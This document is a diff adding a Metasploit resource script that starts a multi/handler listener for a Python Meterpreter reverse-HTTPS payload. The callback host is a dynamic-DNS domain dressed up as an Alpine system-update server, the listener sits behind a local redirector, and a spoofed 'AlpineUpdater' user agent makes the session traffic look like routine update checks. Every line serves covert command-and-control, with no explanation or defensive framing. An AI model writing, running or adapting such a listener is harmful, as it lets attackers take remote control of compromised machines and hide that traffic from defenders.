@@ -1,0 +1,10 @@
+use exploit/multi/handler
+set payload python/meterpreter/reverse_https
+set LHOST ns-alpine-sys-update.duckdns.org
+set LPORT 443
+set ReverseListenerBindAddress 127.0.0.1
+set ReverseListenerBindPort 8888
+set HttpUserAgent AlpineUpdater/1.3
+set OverrideRequestHost true
+set ExitOnSession false
+run -j
